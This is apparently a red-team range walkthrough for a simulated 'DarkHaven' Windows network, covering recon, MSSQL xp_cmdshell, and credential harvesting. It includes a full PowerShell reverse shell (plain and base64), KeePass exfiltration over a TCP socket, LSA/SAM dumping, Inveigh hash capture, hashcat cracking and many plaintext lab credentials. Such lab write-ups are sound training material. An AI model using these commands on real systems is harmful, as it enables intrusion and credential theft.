# Range: DarkHaven- Range: DarkHaven

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image.png)

## **Objective/Scope**

Darkhaven Technologies is a networking organization based throughout the world with locations in NY, CA, Japan, and more. They have segregated their network and would like to do a Red Team engagement to see if a user is able to move throughout the different networks.

A Close Access Team has infiltrated Darkhaven Technologies and dropped a machine for you on the internal network that you can connect to through OpenVPN. This machine should allow you to see the entire global network, as it was dropped on a port that is within the global VLAN. The Close Access Team relayed information that they overheard about the Web Portal being worked on at this time.

***Some attacks might require "user interaction". We have simulated end users on the network, so this is in-scope.***

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%201.png)

- Before we even start with our range engagement, at just a glance - there is some `trust relationship` between `dc.darkhaven.tech` and `dc02.corp.darkhaven.tech` that we might need to dig deep into later.
- Starting with the `web.ext.darkhaven.local`
- Adding our hosts `/etc/hosts`
    
    ```bash
    #Subnet 1
    10.10.10.4 dc.darkhaven.tech darkhaven.tech
    10.10.10.5 dc02.corp.darkhaven.tech corp.darkhaven.tech
    
    #Subnet 2
    10.10.10.132 web.ext.darkhaven.local
    10.10.10.134 ca.ext.darkhaven.local
    10.10.10.133 sql.ext.darkhaven.local
    10.10.10.135 share.ext.darkhaven.local
    10.10.10.136 dc.ext.darkhaven.local
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%202.png)
    
- `10.10.10.132 web.ext.darkhaven.local` `10.10.10.133 sql.ext.darkhaven.local` `10.10.10.135 share.ext.darkhaven.local` hosts doesn't respond to ICMP hence when scanning them we might want to use `-Pn`

# Enumerating ***web.ext.darkhaven.local***

```bash
sudo nmap -sC -sV -vv -Pn 10.10.10.132

Not shown: 991 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Darkhaven Technologies \xE2\x80\x93 Secure Network Solutions
|_http-server-header: Microsoft-IIS/10.0
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
1801/tcp open  msmq?         syn-ack ttl 127
2103/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
2105/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
2107/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
3389/tcp open  ms-wbt-server syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=EC2AMAZ-IKFPL26.ext.darkhaven.local
| Issuer: commonName=EC2AMAZ-IKFPL26.ext.darkhaven.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-26T01:17:22
| Not valid after:  2026-08-28T01:17:22
| MD5:     0cb2 234c 2d23 df08 9b9d f5f7 b8fe 7183
| SHA-1:   94c6 29ae 6972 67f5 80fc 0bca 403f bb0a 3e49 66cc
| SHA-256: c29f 67b8 e056 921b f00a a11e 1128 1fed 2229 b8a2 9486 cec5 7094 c937 e200 180a

5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=4/8%Time=69D70C73%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61383/tcp): CLEAN (Timeout)
|   Check 2 (port 29129/tcp): CLEAN (Timeout)
|   Check 3 (port 53674/udp): CLEAN (Timeout)
|   Check 4 (port 35347/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: EC2AMAZ-IKFPL26, NetBIOS user: <unknown>, NetBIOS MAC: 0e:c5:0e:d5:2e:47 (unknown)
| Names:
|   EC2AMAZ-IKFPL26<00>  Flags: <unique><active>
|   DARKHAVEN<00>        Flags: <group><active>
|   EC2AMAZ-IKFPL26<20>  Flags: <unique><active>
| Statistics:
|   0e c5 0e d5 2e 47 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| smb2-time: 
|   date: 2026-04-09T02:19:17
|_  start_date: N/A
|_clock-skew: 0s

```

- Having a website running, a few things we need to do
    - Directory Brute-forcing
    - Subdomains and Virtual Hosts fuzzing
    - Check view source
    - Check /robot.txt
    - check web functionality

***Directory Brute-forcing***

```bash
dirsearch -u http://10.10.10.132 -t 5 

ffuf -u "http:/10.10.10.132/FUZZ" \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt \
-recursion -recursion-depth 2 -c

gobuster dir -u http:/10.10.10.132 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,zip
```

***Subdomains and Virtual Hosts***

```bash
./vhost-fuzzer.sh web.ext.darkhaven.local  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://web.server 1

ffuf -u http:web.ext.darkhaven.local  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.$DOMAIN"
```

***Check web functionality***

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%203.png)

- We are presented with a client portal that directed us to a login page below

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%204.png)

- We do not have any creds yet hence, we need to continue as a guest user

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%205.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%206.png)

- With the guest session, we landed into an IT Help Desk chatbot
- There is an `IT Notice – Action Required` The departmental file share has been renamed from `\\share\DarkHaven to \\share\DarkhavenData`
- Aside from share remapping, The chatbot can also help with: `"Look up user sql_svc"`  |  `"Find employee Smith"`  |  `"What are your hours?"`
- Lets try all these to see what we find

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%207.png)

- The lookup user query provided us with potential creds for `sql_svc` account
    
    ```bash
    	sql_svc:SqLS3rvic3!
    ```
    
    - We do need to validate our creds against an external domain controller
        
        ```bash
        nxc smb scope.txt -u "sql_svc" -p 'SqLS3rvic3!'  
        
        ```
        
        ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%208.png)
        
        - We can confirm the creds are valid
        - Now lets enumerate the  `sql.ext.darkhaven.local` as our creds are pointing us to that direction

# Enumerating ******sql.ext.darkhaven.local

```bash
sudo nmap -sC -sV -vv -Pn 10.10.10.133

PORT     STATE SERVICE       REASON          VERSION
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.133\MSSQLSERVER: 
|     Target_Name: DARKHAVEN
|     NetBIOS_Domain_Name: DARKHAVEN
|     NetBIOS_Computer_Name: SQL
|     DNS_Domain_Name: ext.darkhaven.local
|     DNS_Computer_Name: sql.ext.darkhaven.local
|_    Product_Version: 10.0.26100
| ms-sql-info: 
|   10.10.10.133\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
|_ssl-date: 2026-04-09T02:22:21+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-09T01:47:47
| Not valid after:  2056-04-09T01:47:47
| MD5:     c776 220d b763 0c01 2a99 4b71 8aec 6473
| SHA-1:   84a1 e1b6 0fd4 c10a fb5d 1001 2156 2ac9 00df 4d20
| SHA-256: 0b1b 75e6 3d22 2f63 1664 4f50 dc4b 52b9 8948 a9a4 f361 df44 f565 4706 34c5 3ffc

3389/tcp open  ms-wbt-server syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=sql.ext.darkhaven.local
| Issuer: commonName=sql.ext.darkhaven.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-26T14:25:36
| Not valid after:  2026-08-28T14:25:36
| MD5:     d0a4 fe75 b8ea 56b8 81b7 cb42 5fc3 9b9b
| SHA-1:   e598 84fd 182d 40dd fcc9 541f 067c ead7 50ad 323f
| SHA-256: 15ea f9b2 19b9 1a61 fcf2 63ea 66f4 b195 8b50 aa44 a756 7177 ffb0 2fa7 987f e0ee

5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=4/8%Time=69D70D56%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: -1s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 22:22
Completed NSE at 22:22, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 22:22
Completed NSE at 22:22, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 22:22
Completed NSE at 22:22, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.96 seconds
           Raw packets sent: 2004 (88.176KB) | Rcvd: 10 (440B)
RedBlue@Frank DarkHaven % 

```

- mssql is open and we can try to authenticate with our creds

```bash
mssqlclient.py sql_svc:'SqLS3rvic3!'@10.10.10.133
impacket-mssqlclient ext.darkhaven.local/sql_svc:'SqLS3rvic3!'@10.10.10.133
mssqlclient.py ext.darkhaven.local/sql_svc:'SqLS3rvic3!'@10.10.10.133
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%209.png)

## Getting a shell - PowerShell reverse shell

```bash
xp_cmdshell powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.211.2',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

nc -lvnp 4444
```

### Generate the Base64 on your Kali machine

```bash
echo -n '$client = New-Object System.Net.Sockets.TCPClient("192.168.211.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -t utf16le | base64 -w 0

```

```bash
xp_cmdshell "powershell -nop -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMQAxAC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2010.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2011.png)

#### SQl- ROOT Flag

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2012.png)

#### Post Exploitation

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2013.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2014.png)

- discovered a KeePass database containing credentials for the Domain Controller, Core Switches, Firewall, and even Azure/M365 portals.
- The `README.txt` just handed us the **Master Password** on a silver platter: `D@rkhav3n_IT_2024!`

***Transferring `it_passwords.kdbx` to our local Machine***

```bash
**#Start a listener that saves the input to a file**
nc -lvnp 8888 > it_passwords.kdbx

#In your Windows Shell
$file = [System.IO.File]::ReadAllBytes("C:\stored_passwords\it_passwords.kdbx");
$client = New-Object System.Net.Sockets.TCPClient("192.168.211.2", 8888);
$stream = $client.GetStream();
$stream.Write($file, 0, $file.Length);
$stream.Close();
$client.Close();
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2015.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2016.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2017.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2018.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2019.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2020.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2021.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2022.png)

- Opening the database revealed clear-text credentials for every critical layer of the network
- We need to check the creds against the external dc if they are valid.
- First we need to check for a password policy before attempting to password spray
    
    ```bash
    nxc smb dc.ext.darkhaven.local -u sql_svc -p 'SqLS3rvic3!' --pass-pol
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2023.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2024.png)
    
    - Based on the password policy we just retrieved, password spraying with this specific list is not ideal as our primary next step
    - **Threshold of 5:** The domain has an **Account Lockout Threshold of 5**.
    - **List Size:** We have a list of **8 passwords**.
    - If we spray the full `passwords.txt` against  `usernames.txt`, we will hit **8 failed attempts** for every account where the password doesn't match, causing an immediate **30-minute lockout** for the entire IT department and all service accounts.
    - What we then need to do is a `Direct Credential Mapping` to verify and test each pair against the scope.
    - `svc_backup` and `svc_webpool` looks interesting to dig deep.
        
        ***Check Service Account Persistence***
        
        ```bash
        nxc smb scope.txt -u 'svc_backup' -p 'V33mB@ckup#2024' --shares
        
        nxc smb dc.ext.darkhaven.local -u svc_backup -p 'V33mB@ckup#2024'
        nxc smb dc.ext.darkhaven.local -u svc_webpool -p 'W3bP00l!'
        nxc smb dc.ext.darkhaven.local -u Administrator -p 'D@rkhav3n_DSRM_2024!'
        ```
        
        ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2025.png)
        
        - `svc_backup` credentials provide **Read** access across almost the entire core infrastructure.
        - This account is essentially a `golden ticket` for data discovery since it can touch the Domain Controller, File Share, and Certificate Authority.
        - **Domain Controller (10.10.10.136):** We have access to `SYSVOL` and `NETLOGON`. This is useful for hunting for scripts or GPO files that might contain even more credentials or misconfigurations.
        - **Departmental File Share (10.10.10.135):** We have access to `DarkhavenData`. This is a high-priority target for sensitive documents, configuration backups, or `forgotten` password files.
        - **Certificate Authority (10.10.10.134):** We can read `CertEnroll`. This confirms the server is running AD Certificate Services (ADCS), which could be vulnerable to ESC1/ESC8 escalation attacks if misconfigured.
    
    Since we have verified **READ** permissions on the `DarkhavenData` share at `10.10.10.135` using the `svc_backup` credentials, this is our primary target for sensitive information.
    

# Enumerating ***share***.ext.darkhaven.local

```bash
sudo nmap -sC -sV -vv -Pn 10.10.10.135

PORT     STATE SERVICE       REASON          VERSION
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: DARKHAVEN
|   NetBIOS_Domain_Name: DARKHAVEN
|   NetBIOS_Computer_Name: SHARE
|   DNS_Domain_Name: ext.darkhaven.local
|   DNS_Computer_Name: share.ext.darkhaven.local
|   DNS_Tree_Name: ext.darkhaven.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-04-10T02:14:28+00:00
| ssl-cert: Subject: commonName=share.ext.darkhaven.local
| Issuer: commonName=share.ext.darkhaven.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-26T16:18:55
| Not valid after:  2026-08-28T16:18:55
| MD5:     09ea c012 9a0b 7fc5 86f1 3e2d ee8d 4342
| SHA-1:   c7ef 7ada 32f3 a524 156a 06ab e8c0 a8c7 28ec 6e74
| SHA-256: 5ee6 0db7 453b 0608 9f4c 5d0e 32fd 32fc 1147 03a8 54c9 cf7e b9ea 690f f447 e863

5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=4/9%Time=69D85CFA%P=x86_64-pc-linux-gnu%r(Ter
SF:minalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\0
SF:\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

```bash
nxc smb 10.10.10.135 -u 'svc_backup' -p 'V33mB@ckup#2024' --spider DarkhavenData
nxc smb 10.10.10.135 -u 'svc_backup' -p 'V33mB@ckup#2024' --spider DarkhavenData --pattern "pass"

smbclient //10.10.10.135/DarkhavenData -U 'ext.darkhaven.local\svc_backup%V33mB@ckup#2024'
# Once inside:
get Interesting_File.txt

```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2026.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2027.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2028.png)

- Managed to obtain these many .txt files. We need to inspect them
    
    ```bash
    grep -riEi "pass|pwd|secret|key|login|user|admin" *.txt
     
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2029.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2030.png)
    
    - From `Network_Infrastructure_Runbook_v3.txt` we got creds
        
        ```bash
        #Credentials
        fwadmin : PAN_F!r3w@ll2024#ext
        netadmin : C!sc0_C0r3$witch24
        switchadmin : Acc3ss$W1tch_24!
        prtgadmin : PRTG_M0n!t0r@2024
        oobm_admin : 00BM_K0ns0le#2024
        vpnadmin : VPN_G@t3way$2024!
        wifiadmin : W1F!_C0ntr0ll3r#24
        svc_netops : N3t0ps$Svc_2024!
        ```
        
    - We noticed a Role : Local Administrator on share server referring to `svc_netops`
    - We need to test it immediately
        
        ```bash
        nxc smb 10.10.10.135 -u svc_netops -p 'N3t0ps$Svc_2024!'
        psexec.py ext.darkhaven.local/svc_netops:'N3t0ps$Svc_2024!'@10.10.10.135
        nxc smb 10.10.10.135 -u svc_netops -p 'N3t0ps$Svc_2024!' --local-auth
        ```
        
        ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2031.png)
        
        - Local service accounts like `netops` (Network Operations) often have elevated privileges on the local machine to manage services or configurations.
        - check if this account has administrative rights. If it does, we can dump the local SAM database or the LSASS process memory to find domain credentials that might be cached there.
        
        ```bash
        nxc smb 10.10.10.135 -u svc_netops -p 'N3t0ps$Svc_2024!' --local-auth --shares
        
        ```
        
        ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2032.png)
        
        - This account seems to have the same level of access as the domain `svc_backup` account we used earlier.
        - It's worth checking if there's a folder on the share that `svc_backup` couldn't see, but `svc_netops` can. Sometimes permissions are set explicitly for local users. (We can get back if we get stuck)
    - On our scan, `rdp and winrm` are open. We can test our creds to check if we do have access to remote management
        
        ```bash
        nxc winrm 10.10.10.135 -u svc_netops -p 'N3t0ps$Svc_2024!' --local-auth
        nxc rdp 10.10.10.135 -u svc_netops -p 'N3t0ps$Svc_2024!' --local-auth
        ```
        
        ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2033.png)
        
        - the **RDP** service is wide open for `svc_netops`, and we got **(Pwn3d!)** status.
        - We can perform ****`Credential Harvesting`**:** Now that we have a session on `SHARE`, we can check for **Domain Admin** tokens or passwords cached in memory (LSASS) if an admin has recently logged in to manage the file shares.

### RDP ACCESS AS `svc_netops`

```bash
xfreerdp3 /v:10.10.10.135 /u:svc_netops /p:'N3t0ps$Svc_2024!' /drive:share,$(pwd) /dynamic-resolution +clipboard /cert:ignore
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2034.png)

#### Share- ROOT Flag

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2035.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2036.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2037.png)

- Lets look into user `showard` if we can get anything interesting to look for

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2038.png)

- Nothing really interesting here
- We can perform ****`Credential Harvesting`
    
    ```bash
    netexec smb 10.10.10.135 --local-auth -u svc_netops -p 'N3t0ps$Svc_2024!' --lsa
    netexec smb 10.10.10.13 --local-auth -u svc_netops -p 'N3t0ps$Svc_2024!' --sam
    
    #**Hunting for passwords in PowerShell Histories**
    nxc smb 10.10.10.135 --local-auth -u svc_netops -p 'N3t0ps$Svc_2024!' -M powershell_history -o export=True
    
    Get-ChildItem -Path C:\Users\ -Filter ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue | foreach { 
        Write-Host "`n--- Checking History for: $($_.FullName) ---" -ForegroundColor Cyan
        Select-String -Path $_.FullName -Pattern "pass", "user", "net ", "svc", "admin"
    }
    
    #**Inveigh( Windows machine)**
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2039.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2040.png)
    

We now need to utilise `Inveigh` as it is a cross-platform LLMNR/mDNS/NBNS spoofer (similar to Responder, but written in PowerShell/C#) that allows you to capture NTLMv2 hashes from `other machines on the network`.

https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/refs/heads/master/Inveigh.ps1

- Inveigh is a Windows-based, PowerShell tool used for network-based credential capture and man-in-the-middle (MITM) attacks. It performs techniques similar to tools like Responder, targeting protocols such as LLMNR (Link-Local Multicast Name Resolution) and NBNS (NetBIOS Name Service) to trick Windows systems into sending authentication attempts to the attacker's machine. Once received, Inveigh captures NTLM hashes, which can later be cracked offline or used in pass-the-hash attacks. It’s commonly used in internal penetration tests and red team engagements to harvest user credentials passively.
    
    ```bash
    #Transfering Inveigh.exe
    #KALI
    python3 -m http.server
    
    #WIndows Machine
    wget http://192.168.211.2:8000/Inveigh.exe -OutFile Inveigh.exe
    
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2041.png)
    
    - We obtained an NTLM hash for `svc_wepool` and we can try and crack it.
    - If we recall, we do have an `it_security_wordlist.txt`  that we obtained earlier on in the shares. We can attempt to use that before utilising wordlist like rockyou.txt and or seclists ones
    
    ```bash
    hashcat -m 5600 -a 0 webpool_hash.txt it_security_wordlist.txt
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2042.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2043.png)
    
    - Previously we obtained the creds below:
    
    ```bash
    #Obtained from the keepass file
    svc_webpool:W3bP00l!
    
    #Obtained from the NTLM hash
    svc_webpool:D@rkH@v3n128!
    
    #Verify the creds
    
    nxc smb scope.txt -u 'svc_webpool' -p 'D@rkH@v3n128!' --shares
    nxc rdp scope.txt -u 'svc_webpool' -p 'D@rkH@v3n128!' 
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2044.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2045.png)
    
    - `svc_webpool` has valid domain credentials across almost the entire core infrastructure including the **Domain Controller (`DC`)**, the **Certificate Authority (`CA`)**, and the **`SHARE`** server
    
    ```bash
    nxc ldap 10.10.10.136 -u 'svc_webpool' -p 'D@rkH@v3n128!' -M adcs
    
    nxc ldap dc.ext.darkhaven.local -u 'svc_webpool' -p 'D@rkH@v3n128!' --bloodhound --collection All --dns-server 10.10.10.136
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2046.png)
    
    - We just confirmed that **Active Directory Certificate Services (ADCS)** is live, and the Enrollment Server is `ca.ext.darkhaven.local` (which matches your `10.10.10.134` target).
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2047.png)
    
    - Bloodhound failed.

### Bloodhound data

```bash
wget http://192.168.211.2:8000/SharpHound.ps1 -OutFile SharpHound.ps1
wget http://192.168.211.2:8000/SharpHound.exe -OutFile SharpHound.exe
```

```bash
PS C:\Users\Administrator\Desktop> ./SharpHound.exe -c All
2026-04-10T08:55:41.2859697+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-04-10T08:55:41.3125837+00:00|INFORMATION|SharpHound Version: 2.12.0.0
2026-04-10T08:55:41.3125837+00:00|INFORMATION|SharpHound Common Version: 4.6.1.0
2026-04-10T08:55:41.4732022+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-04-10T08:55:41.5136189+00:00|INFORMATION|Initializing SharpHound at 8:55 AM on 4/10/2026
2026-04-10T08:55:41.8712469+00:00|INFORMATION|Resolved current domain to ext.darkhaven.local
2026-04-10T08:55:42.2007280+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-04-10T08:55:42.2938508+00:00|INFORMATION|Beginning LDAP search for ext.darkhaven.local
2026-04-10T08:55:42.2938508+00:00|INFORMATION|Collecting AdminSDHolder data for ext.darkhaven.local
2026-04-10T08:55:42.3633883+00:00|INFORMATION|AdminSDHolder ACL hash A5DBB8F2CA441088CAEDCC50B67D126FDFEB840C calculated for ext.darkhaven.local.
2026-04-10T08:55:42.4847517+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
